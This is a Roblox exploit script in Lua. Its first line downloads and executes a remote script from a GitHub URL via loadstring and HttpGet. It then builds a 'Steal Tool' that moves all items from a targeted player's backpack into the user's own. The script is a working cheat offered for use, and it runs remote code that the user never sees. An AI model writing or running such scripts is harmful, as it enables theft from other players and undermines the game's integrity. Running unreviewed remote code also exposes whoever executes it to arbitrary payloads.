loadstring(game:HttpGet(("https://raw.githubusercontent.com/novaghoul/Roblox/main/Script/1st.lua"), true))() -- 1st Lua

pcall(function()
    if sg:GetCoreGuiEnabled(2) == false then
        sg:SetCoreGuiEnabled(2, true)
    end
    if bp:FindFirstChild("Steal Tool") then
        bp:FindFirstChild("Steal Tool"):Destroy()
    end
	local tool = Instance.new("Tool")
	tool.RequiresHandle = false
	tool.Name = "Steal Tool"
	tool.CanBeDropped = false
	tool.Parent = bp
    tool.Activated:connect(function()
        if not mouse.Target then return end
		local tp = mouse.Target.Parent
		if tp:FindFirstChild("Humanoid") then
			local plrr = plrs:FindFirstChild(tp.Name)
			for _,v in pairs(plrr.Backpack:GetChildren()) do
				v.Parent = lplr.Backpack
			end
		elseif tp.Parent:FindFirstChild("Humanoid") then
			local plrr = plrs:FindFirstChild(tp.Parent.Name)
			for _,v in pairs(plrr.Backpack:GetChildren()) do
				v.Parent = lplr.Backpack
			end
		end
	end)
end)